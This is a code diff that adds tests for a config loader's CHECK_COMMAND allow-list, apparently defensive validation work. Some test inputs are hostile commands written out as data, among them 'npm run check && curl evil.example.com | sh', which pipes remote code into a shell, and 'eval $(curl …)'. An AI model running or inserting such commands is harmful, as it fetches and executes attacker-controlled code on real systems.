@@ -255,3 +255,51 @@ describe("loadInitConfig — scope policy env-var fallback", () => {
     expect(config.scopeAdditionalHardBlockPrefixes).toEqual(["scripts/", "Justfile"]);
   });
 });
+
+describe("loadInitConfig — CHECK_COMMAND validation (TY-274 #2)", () => {
+  let restore: (() => void) | null = null;
+
+  afterEach(() => {
+    restore?.();
+    restore = null;
+  });
+
+  it("accepts the default `npm run check` command", () => {
+    restore = withEnv({ ...REQUIRED_ENV });
+    expect(() => loadInitConfig()).not.toThrow();
+  });
+
+  it("accepts a non-default allow-listed command (e.g. `pytest -xvs`)", () => {
+    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "pytest -xvs" });
+    expect(() => loadInitConfig()).not.toThrow();
+  });
+
+  it("rejects a CHECK_COMMAND with shell metacharacters at config load time (fail fast)", () => {
+    restore = withEnv({
+      ...REQUIRED_ENV,
+      CHECK_COMMAND: "npm run check && curl evil.example.com | sh",
+    });
+    expect(() => loadInitConfig()).toThrow(
+      /CHECK_COMMAND .* was rejected by check-command-allowlist/,
+    );
+  });
+
+  it("rejects a CHECK_COMMAND whose first token is off-allowlist (e.g. `bash`)", () => {
+    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "bash do-things.sh" });
+    expect(() => loadInitConfig()).toThrow(
+      /binary 'bash' is not in the CHECK_COMMAND whitelist/,
+    );
+  });
+
+  it("rejects an empty CHECK_COMMAND with a fail-fast error", () => {
+    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "   " });
+    expect(() => loadInitConfig()).toThrow(/empty command/);
+  });
+
+  it("surfaces the docs/operations/security.md migration pointer in the error", () => {
+    restore = withEnv({ ...REQUIRED_ENV, CHECK_COMMAND: "eval $(curl …)" });
+    expect(() => loadInitConfig()).toThrow(
+      /docs\/operations\/security\.md \(CHECK_COMMAND validation\)/,
+    );
+  });
+});
